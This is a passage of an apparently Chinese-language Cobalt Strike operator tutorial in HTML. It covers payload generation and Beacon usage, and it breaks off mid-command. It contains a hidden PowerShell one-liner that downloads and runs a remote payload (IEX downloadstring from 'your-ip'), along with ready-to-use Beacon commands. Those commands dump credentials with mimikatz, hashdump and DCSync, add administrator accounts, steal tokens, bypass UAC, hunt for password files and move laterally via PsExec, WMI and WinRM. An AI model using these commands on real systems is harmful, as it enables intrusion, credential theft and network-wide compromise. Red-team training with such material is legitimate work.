+</tr>
+<tr>
+<td><strong>Windows DLL</strong></td>
+<td><code>Packages → Windows Executable (S)</code> → DLL</td>
+<td>DLL 文件</td>
+</tr>
+<tr>
+<td><strong>PowerShell</strong></td>
+<td><code>Packages → Payload Generator</code></td>
+<td>PowerShell 一行命令</td>
+</tr>
+<tr>
+<td><strong>Python</strong></td>
+<td><code>Packages → Payload Generator</code></td>
+<td>Python 载荷</td>
+</tr>
+<tr>
+<td><strong>C# Source</strong></td>
+<td><code>Packages → Payload Generator</code></td>
+<td>C# 源码</td>
+</tr>
+<tr>
+<td><strong>RAW</strong></td>
+<td><code>Packages → Payload Generator</code></td>
+<td>原始 Shellcode</td>
+</tr>
+<tr>
+<td><strong>HTA</strong></td>
+<td><code>Packages → HTML Application</code></td>
+<td>HTML 应用程序</td>
+</tr>
+<tr>
+<td><strong>Office Macro</strong></td>
+<td><code>Packages → MS Office Macro</code></td>
+<td>Office 宏病毒</td>
+</tr>
+<tr>
+<td><strong>VBA Script</strong></td>
+<td><code>Packages → Scripted Web Delivery</code></td>
+<td>VBS 脚本</td>
+</tr>
+<tr>
+<td><strong>Stageless EXE</strong></td>
+<td><code>Listeners → Payload → Windows Executable</code></td>
+<td>无阶段 EXE</td>
+</tr>
+</tbody></table>
+<h3 id="6-3-常用载荷生成"><a href="#6-3-常用载荷生成" class="headerlink" title="6.3 常用载荷生成"></a>6.3 常用载荷生成</h3><h4 id="EXE-载荷"><a href="#EXE-载荷" class="headerlink" title="EXE 载荷"></a>EXE 载荷</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">Cobalt Strike → Attacks → Packages → Windows Executable (S)<br><span class="hljs-symbol">  Listener:</span> https_listener<br><span class="hljs-symbol">  Output:</span> Windows EXE<br><span class="hljs-symbol">  x64:</span> ✓<br></code></pre></td></tr></table></figure>
+
+<h4 id="PowerShell-载荷"><a href="#PowerShell-载荷" class="headerlink" title="PowerShell 载荷"></a>PowerShell 载荷</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">Cobalt Strike → Attacks → Packages → Payload Generator<br><span class="hljs-symbol">  Listener:</span> https_listener<br><span class="hljs-symbol">  Output:</span> PowerShell<br></code></pre></td></tr></table></figure>
+
+<h4 id="Office-宏"><a href="#Office-宏" class="headerlink" title="Office 宏"></a>Office 宏</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Cobalt Strike → Attacks → Packages → <span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span> Macro<br>  Listener: https_listener<br>  → 复制生成的宏代码 → 粘贴到 Word/Excel 宏中<br></code></pre></td></tr></table></figure>
+
+<h4 id="HTA-载荷"><a href="#HTA-载荷" class="headerlink" title="HTA 载荷"></a>HTA 载荷</h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Cobalt Strike → Attacks → Packages → HTML Application<br>  Listener: https_listener<br>  <span class="hljs-keyword">Method</span>: Powershell<br></code></pre></td></tr></table></figure>
+
+<h4 id="Scripted-Web-Delivery"><a href="#Scripted-Web-Delivery" class="headerlink" title="Scripted Web Delivery"></a>Scripted Web Delivery</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">Cobalt Strike → Attacks → Web Drive-by → Scripted Web Delivery<br>  <span class="hljs-params">URI:</span> <span class="hljs-symbol">/update</span><br>  <span class="hljs-params">Listener:</span> https_listener<br>  <span class="hljs-params">Type:</span> PowerShell <span class="hljs-symbol">/</span> VBS <span class="hljs-symbol">/</span> Python <span class="hljs-symbol">/</span> Ruby<br>  → 生成一个下载 URL，目标执行一行命令即可上线<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、上线与-Beacon-交互"><a href="#七、上线与-Beacon-交互" class="headerlink" title="七、上线与 Beacon 交互"></a>七、上线与 Beacon 交互</h2><h3 id="7-1-目标执行载荷"><a href="#7-1-目标执行载荷" class="headerlink" title="7.1 目标执行载荷"></a>7.1 目标执行载荷</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ─── PowerShell 下载执行 ───</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://your-ip:80/update&#x27;))&quot;</span><br><br><span class="hljs-comment"># ─── 或直接执行 EXE ───</span><br>.\payload.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-2-Beacon-交互"><a href="#7-2-Beacon-交互" class="headerlink" title="7.2 Beacon 交互"></a>7.2 Beacon 交互</h3><p>上线后在 <strong>Targets</strong> 视图看到 Beacon，右键 → <strong>Interact</strong> 打开命令行。</p>
+<h3 id="7-3-Beacon-类型"><a href="#7-3-Beacon-类型" class="headerlink" title="7.3 Beacon 类型"></a>7.3 Beacon 类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>beacon</code></td>
+<td>Staged Beacon（分阶段）</td>
+</tr>
+<tr>
+<td><code>beacon_tcp</code></td>
+<td>TCP Beacon</td>
+</tr>
+<tr>
+<td><code>beacon_dns</code></td>
+<td>DNS Beacon</td>
+</tr>
+<tr>
+<td><code>beacon_smb</code></td>
+<td>SMB Beacon</td>
+</tr>
+<tr>
+<td><code>beacon_extc2</code></td>
+<td>External C2 Beacon</td>
+</tr>
+</tbody></table>
+<h3 id="7-4-Beacon-通信模式"><a href="#7-4-Beacon-通信模式" class="headerlink" title="7.4 Beacon 通信模式"></a>7.4 Beacon 通信模式</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ─── 同步模式（默认）───</span><br><span class="hljs-comment"># Beacon 定期回连 Team Server 获取命令</span><br><br><span class="hljs-comment"># ─── 异步模式 ───</span><br><span class="hljs-attribute">sleep</span> <span class="hljs-number">60</span>         # <span class="hljs-number">60</span> 秒回连一次<br><span class="hljs-attribute">sleep</span> <span class="hljs-number">60</span> <span class="hljs-number">30</span>      # <span class="hljs-number">60</span> 秒 ± <span class="hljs-number">30</span> 秒随机抖动<br><br><span class="hljs-comment"># ─── 交互模式（实时）───</span><br><span class="hljs-attribute">sleep</span> <span class="hljs-number">0</span>          # 持续通信，适合横向移动等操作<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、Beacon-命令大全"><a href="#八、Beacon-命令大全" class="headerlink" title="八、Beacon 命令大全"></a>八、Beacon 命令大全</h2><h3 id="8-1-基础命令"><a href="#8-1-基础命令" class="headerlink" title="8.1 基础命令"></a>8.1 基础命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>help</code></td>
+<td>显示帮助</td>
+</tr>
+<tr>
+<td><code>help &lt;命令&gt;</code></td>
+<td>显示指定命令帮助</td>
+</tr>
+<tr>
+<td><code>sleep &lt;秒&gt;</code></td>
+<td>设置回连间隔</td>
+</tr>
+<tr>
+<td><code>sleep &lt;秒&gt; &lt;抖动&gt;</code></td>
+<td>设置回连间隔 + 随机抖动</td>
+</tr>
+<tr>
+<td><code>sleep 0</code></td>
+<td>进入交互模式（持续通信）</td>
+</tr>
+<tr>
+<td><code>checkin</code></td>
+<td>强制 Beacon 立即回连</td>
+</tr>
+<tr>
+<td><code>note &lt;备注&gt;</code></td>
+<td>给 Beacon 添加备注</td>
+</tr>
+<tr>
+<td><code>mode dns</code></td>
+<td>切换 DNS 传输模式</td>
+</tr>
+<tr>
+<td><code>mode dns-txt</code></td>
+<td>DNS TXT 记录传输</td>
+</tr>
+<tr>
+<td><code>mode dns6</code></td>
+<td>DNS AAAA 记录传输</td>
+</tr>
+<tr>
+<td><code>mode http</code></td>
+<td>HTTP 传输模式</td>
+</tr>
+<tr>
+<td><code>jobs</code></td>
+<td>查看后台任务</td>
+</tr>
+<tr>
+<td><code>jobkill &lt;JID&gt;</code></td>
+<td>终止后台任务</td>
+</tr>
+<tr>
+<td><code>exit</code></td>
+<td>退出 Beacon（清除自身）</td>
+</tr>
+<tr>
+<td><code>kill &lt;PID&gt;</code></td>
+<td>杀死进程</td>
+</tr>
+</tbody></table>
+<h3 id="8-2-文件与目录"><a href="#8-2-文件与目录" class="headerlink" title="8.2 文件与目录"></a>8.2 文件与目录</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls</code></td>
+<td>列出目录</td>
+</tr>
+<tr>
+<td><code>cd &lt;目录&gt;</code></td>
+<td>切换目录</td>
+</tr>
+<tr>
+<td><code>pwd</code></td>
+<td>当前目录</td>
+</tr>
+<tr>
+<td><code>mkdir &lt;目录&gt;</code></td>
+<td>创建目录</td>
+</tr>
+<tr>
+<td><code>rm &lt;文件&gt;</code></td>
+<td>删除文件</td>
+</tr>
+<tr>
+<td><code>cp &lt;源&gt; &lt;目标&gt;</code></td>
+<td>复制文件</td>
+</tr>
+<tr>
+<td><code>mv &lt;源&gt; &lt;目标&gt;</code></td>
+<td>移动文件</td>
+</tr>
+<tr>
+<td><code>cat &lt;文件&gt;</code></td>
+<td>查看文件内容</td>
+</tr>
+<tr>
+<td><code>download &lt;文件&gt;</code></td>
+<td>下载文件到 Team Server</td>
+</tr>
+<tr>
+<td><code>downloads</code></td>
+<td>查看正在下载的文件</td>
+</tr>
+<tr>
+<td><code>cancel</code></td>
+<td>取消下载</td>
+</tr>
+<tr>
+<td><code>upload &lt;文件&gt;</code></td>
+<td>上传文件到目标</td>
+</tr>
+<tr>
+<td><code>drives</code></td>
+<td>列出磁盘分区</td>
+</tr>
+</tbody></table>
+<h3 id="8-3-系统信息"><a href="#8-3-系统信息" class="headerlink" title="8.3 系统信息"></a>8.3 系统信息</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>getuid</code></td>
+<td>获取当前用户</td>
+</tr>
+<tr>
+<td><code>getsystem</code></td>
+<td>尝试获取 SYSTEM 权限</td>
+</tr>
+<tr>
+<td><code>getprivs</code></td>
+<td>获取可用特权</td>
+</tr>
+<tr>
+<td><code>whoami /all</code></td>
+<td>完整用户信息</td>
+</tr>
+<tr>
+<td><code>sysinfo</code></td>
+<td>系统信息（OS&#x2F;版本&#x2F;主机名&#x2F;架构）</td>
+</tr>
+<tr>
+<td><code>ipconfig</code></td>
+<td>网络配置</td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>网络连接</td>
+</tr>
+<tr>
+<td><code>hostname</code></td>
+<td>主机名</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>环境变量</td>
+</tr>
+<tr>
+<td><code>uptime</code></td>
+<td>系统运行时间</td>
+</tr>
+</tbody></table>
+<h3 id="8-4-进程管理"><a href="#8-4-进程管理" class="headerlink" title="8.4 进程管理"></a>8.4 进程管理</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ps</code></td>
+<td>列出进程</td>
+</tr>
+<tr>
+<td><code>runas &lt;用户&gt; &lt;命令&gt;</code></td>
+<td>以其他用户身份运行</td>
+</tr>
+<tr>
+<td><code>spawn &lt;listener&gt;</code></td>
+<td>派生新 Beacon（指定监听器）</td>
+</tr>
+<tr>
+<td><code>spawn &lt;arch&gt; &lt;listener&gt;</code></td>
+<td>指定架构派生</td>
+</tr>
+<tr>
+<td><code>inject &lt;PID&gt; &lt;listener&gt;</code></td>
+<td>注入进程获取新 Beacon</td>
+</tr>
+<tr>
+<td><code>shinject &lt;PID&gt; &lt;架构&gt; &lt;shellcode文件&gt;</code></td>
+<td>注入自定义 Shellcode</td>
+</tr>
+<tr>
+<td><code>mimikatz &lt;命令&gt;</code></td>
+<td>执行 Mimikatz 命令</td>
+</tr>
+<tr>
+<td><code>execute-assembly &lt;exe&gt; [参数]</code></td>
+<td>在内存中执行 .NET 程序</td>
+</tr>
+<tr>
+<td><code>inline-assembly &lt;exe&gt; [参数]</code></td>
+<td>内联执行 .NET</td>
+</tr>
+<tr>
+<td><code>powershell &lt;命令&gt;</code></td>
+<td>执行 PowerShell</td>
+</tr>
+<tr>
+<td><code>powershell-import &lt;脚本&gt;</code></td>
+<td>导入 PowerShell 脚本</td>
+</tr>
+<tr>
+<td><code>run &lt;命令&gt; [参数]</code></td>
+<td>执行系统命令（cmd）</td>
+</tr>
+<tr>
+<td><code>shell &lt;命令&gt;</code></td>
+<td>执行 Shell 命令</td>
+</tr>
+<tr>
+<td><code>cmd &lt;命令&gt;</code></td>
+<td>通过 cmd.exe 执行</td>
+</tr>
+</tbody></table>
+<h3 id="8-5-用户与凭据"><a href="#8-5-用户与凭据" class="headerlink" title="8.5 用户与凭据"></a>8.5 用户与凭据</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net user</code></td>
+<td>列出用户</td>
+</tr>
+<tr>
+<td><code>net user &lt;用户&gt; &lt;密码&gt; /add</code></td>
+<td>添加用户</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators &lt;用户&gt; /add</code></td>
+<td>添加管理员</td>
+</tr>
+<tr>
+<td><code>hashdump</code></td>
+<td>导出本地哈希（需 SYSTEM）</td>
+</tr>
+<tr>
+<td><code>logonpasswords</code></td>
+<td>Mimikatz 抓取凭据</td>
+</tr>
+<tr>
+<td><code>dcsync &lt;域&gt; &lt;用户&gt;</code></td>
+<td>DCSync 导出用户哈希</td>
+</tr>
+<tr>
+<td><code>kerberos_ticket_purge</code></td>
+<td>清除 Kerberos 票据</td>
+</tr>
+<tr>
+<td><code>steal_token &lt;PID&gt;</code></td>
+<td>窃取进程 Token</td>
+</tr>
+<tr>
+<td><code>make_token &lt;用户&gt; &lt;密码&gt;</code></td>
+<td>制作 Token</td>
+</tr>
+<tr>
+<td><code>rev2self</code></td>
+<td>恢复原始 Token</td>
+</tr>
+<tr>
+<td><code>creds</code></td>
+<td>查看已获取的凭据</td>
+</tr>
+<tr>
+<td><code>creds add &lt;域&gt; &lt;用户&gt; &lt;密码&gt;</code></td>
+<td>手动添加凭据</td>
+</tr>
+<tr>
+<td><code>creds add &lt;域&gt; &lt;用户&gt; &lt;NTLM哈希&gt;</code></td>
+<td>添加哈希</td>
+</tr>
+<tr>
+<td><code>token-store</code></td>
+<td>Token 存储管理</td>
+</tr>
+</tbody></table>
+<h3 id="8-6-网络"><a href="#8-6-网络" class="headerlink" title="8.6 网络"></a>8.6 网络</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>arp &lt;IP&gt;</code></td>
+<td>ARP 扫描</td>
+</tr>
+<tr>
+<td><code>portscan &lt;IP段&gt; &lt;端口&gt; &lt;模式&gt;</code></td>
+<td>端口扫描</td>
+</tr>
+<tr>
+<td><code>run hostname &lt;IP&gt;</code></td>
+<td>反查主机名</td>
+</tr>
+<tr>
+<td><code>covertvpn &lt;接口&gt;</code></td>
+<td>隐蔽 VPN</td>
+</tr>
+<tr>
+<td><code>socks &lt;端口&gt;</code></td>
+<td>SOCKS 代理</td>
+</tr>
+<tr>
+<td><code>socks stop</code></td>
+<td>停止代理</td>
+</tr>
+<tr>
+<td><code>rportfwd &lt;本地端口&gt; &lt;远程IP&gt; &lt;远程端口&gt;</code></td>
+<td>反向端口转发</td>
+</tr>
+<tr>
+<td><code>rportfwd stop &lt;端口&gt;</code></td>
+<td>停止端口转发</td>
+</tr>
+<tr>
+<td><code>connect &lt;IP&gt; &lt;端口&gt;</code></td>
+<td>连接 TCP Beacon</td>
+</tr>
+<tr>
+<td><code>link &lt;IP&gt; &lt;管道&gt;</code></td>
+<td>连接 SMB Beacon</td>
+</tr>
+<tr>
+<td><code>unlink &lt;IP&gt;</code></td>
+<td>断开 SMB Beacon</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="九、信息收集"><a href="#九、信息收集" class="headerlink" title="九、信息收集"></a>九、信息收集</h2><h3 id="9-1-网络发现"><a href="#9-1-网络发现" class="headerlink" title="9.1 网络发现"></a>9.1 网络发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ─── 域信息收集 ───</span><br><span class="hljs-attribute">beacon</span>&gt; shell net view /domain          # 列出域<br><span class="hljs-attribute">beacon</span>&gt; shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain  # 域管<br><span class="hljs-attribute">beacon</span>&gt; shell net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain  # 域机器<br><span class="hljs-attribute">beacon</span>&gt; shell nltest /dclist            # 域控制器列表<br><br><span class="hljs-comment"># ─── ARP 扫描 ───</span><br><span class="hljs-attribute">beacon</span>&gt; arp <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br><span class="hljs-comment"># ─── 端口扫描 ───</span><br><span class="hljs-attribute">beacon</span>&gt; portscan <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">8080</span> arp <span class="hljs-number">100</span><br><br><span class="hljs-comment"># ─── ping sweep ───</span><br><span class="hljs-attribute">beacon</span>&gt; shell for /L %i in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) do @ping -n <span class="hljs-number">1</span> -w <span class="hljs-number">200</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%i | find <span class="hljs-string">&quot;TTL&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="9-2-主机信息"><a href="#9-2-主机信息" class="headerlink" title="9.2 主机信息"></a>9.2 主机信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">sysinfo</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">ipconfig</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">netstat</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">ps</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell systeminfo</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell tasklist /v</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell driverquery</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell schtasks /query /fo LIST /v</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="9-3-文件搜索"><a href="#9-3-文件搜索" class="headerlink" title="9.3 文件搜索"></a>9.3 文件搜索</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell <span class="hljs-built_in">dir</span> /s /b C:\*.txt</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell <span class="hljs-built_in">dir</span> /s /b C:\*password*</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell <span class="hljs-built_in">dir</span> /s /b C:\*.kdbx</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell <span class="hljs-built_in">dir</span> /s /b C:\*.config</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">findstr /si password *.txt *.config *.xml</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、权限提升"><a href="#十、权限提升" class="headerlink" title="十、权限提升"></a>十、权限提升</h2><h3 id="10-1-内置提权"><a href="#10-1-内置提权" class="headerlink" title="10.1 内置提权"></a>10.1 内置提权</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ─── 自动提权 ───</span><br><span class="hljs-keyword">beacon&gt; </span>elevate &lt;exploit&gt; &lt;listener&gt;<br><br><span class="hljs-comment"># ─── 列出可用提权模块 ───</span><br><span class="hljs-keyword">beacon&gt; </span>elevate<br><br><span class="hljs-comment"># ─── 常用提权模块 ───</span><br><span class="hljs-keyword">beacon&gt; </span>elevate uac-token-duplication https_listener<br><span class="hljs-keyword">beacon&gt; </span>elevate svc-exe https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-2-UAC-绕过"><a href="#10-2-UAC-绕过" class="headerlink" title="10.2 UAC 绕过"></a>10.2 UAC 绕过</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">beacon&gt; run whoami /priv  <span class="hljs-comment"># 检查当前权限</span><br><br><span class="hljs-comment"># ─── UAC 绕过 ───</span><br>beacon&gt;<span class="hljs-built_in"> execute-assembly </span>BypassUAC.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-3-内核漏洞利用"><a href="#10-3-内核漏洞利用" class="headerlink" title="10.3 内核漏洞利用"></a>10.3 内核漏洞利用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">─── 通过 MSF 联动 ───</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">spawn x64 msf_listener</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在 MSF 中使用 exploit/windows/local/...</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十一、凭据获取"><a href="#十一、凭据获取" class="headerlink" title="十一、凭据获取"></a>十一、凭据获取</h2><h3 id="11-1-Mimikatz"><a href="#11-1-Mimikatz" class="headerlink" title="11.1 Mimikatz"></a>11.1 Mimikatz</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ─── 导出明文密码（需 SYSTEM）───</span><br><span class="hljs-keyword">beacon&gt; </span>logonpasswords<br><br><span class="hljs-comment"># ─── 或直接调用 Mimikatz ───</span><br><span class="hljs-keyword">beacon&gt; </span>mimikatz sekurlsa::logonpasswords<br><br><span class="hljs-comment"># ─── 导出 SAM ───</span><br><span class="hljs-keyword">beacon&gt; </span>mimikatz lsadump::sam<br><br><span class="hljs-comment"># ─── 导出缓存票据 ───</span><br><span class="hljs-keyword">beacon&gt; </span>mimikatz sekurlsa::tickets<br><br><span class="hljs-comment"># ─── 导出 LSA Secrets ───</span><br><span class="hljs-keyword">beacon&gt; </span>mimikatz lsadump::secrets<br></code></pre></td></tr></table></figure>
+
+<h3 id="11-2-Hashdump"><a href="#11-2-Hashdump" class="headerlink" title="11.2 Hashdump"></a>11.2 Hashdump</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ─── 需要 SYSTEM 权限 ───</span><br><span class="hljs-keyword">beacon&gt; </span>getsystem<br><span class="hljs-keyword">beacon&gt; </span>hashdump<br></code></pre></td></tr></table></figure>
+
+<h3 id="11-3-DCSync（域环境）"><a href="#11-3-DCSync（域环境）" class="headerlink" title="11.3 DCSync（域环境）"></a>11.3 DCSync（域环境）</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"># ─── 需要域管权限 ───<br>beacon&gt; dcsync <span class="hljs-keyword">test</span>.<span class="hljs-keyword">local</span> krbtgt<br>beacon&gt; dcsync <span class="hljs-keyword">test</span>.<span class="hljs-keyword">local</span> administrator<br></code></pre></td></tr></table></figure>
+
+<h3 id="11-4-Token-操作"><a href="#11-4-Token-操作" class="headerlink" title="11.4 Token 操作"></a>11.4 Token 操作</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ─── 窃取进程 Token ───</span><br><span class="hljs-keyword">beacon&gt; </span>steal_token &lt;PID&gt;<br><br><span class="hljs-comment"># ─── 制作 Token（Pass-the-Hash）───</span><br><span class="hljs-keyword">beacon&gt; </span>make_token test.local\admin &lt;NTLM_hash&gt;<br><br><span class="hljs-comment"># ─── 查看凭据 ───</span><br><span class="hljs-keyword">beacon&gt; </span>creds<br><br><span class="hljs-comment"># ─── 恢复原始身份 ───</span><br><span class="hljs-keyword">beacon&gt; </span>rev2self<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十二、横向移动"><a href="#十二、横向移动" class="headerlink" title="十二、横向移动"></a>十二、横向移动</h2><h3 id="12-1-PsExec"><a href="#12-1-PsExec" class="headerlink" title="12.1 PsExec"></a>12.1 PsExec</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ─── 使用 PsExec 横向 ───</span><br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>psexec &lt;目标IP&gt; https_listener<br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>psexec64 &lt;目标IP&gt; https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-2-WMI"><a href="#12-2-WMI" class="headerlink" title="12.2 WMI"></a>12.2 WMI</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>wmi &lt;目标IP&gt; https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-3-WinRM"><a href="#12-3-WinRM" class="headerlink" title="12.3 WinRM"></a>12.3 WinRM</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>winrm &lt;目标IP&gt; https_listener<br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>winrm64 &lt;目标IP&gt; https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-4-SMB-Beacon-横向"><a href="#12-4-SMB-Beacon-横向" class="headerlink" title="12.4 SMB Beacon 横向"></a>12.4 SMB Beacon 横向</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">─── 在目标上派生 SMB Beacon ───</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">spawn x64 smb_listener</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">─── 在中转 Beacon 上 <span class="hljs-built_in">link</span> 到 SMB Beacon ───</span><br><span class="hljs-meta prompt_">beacon&gt; 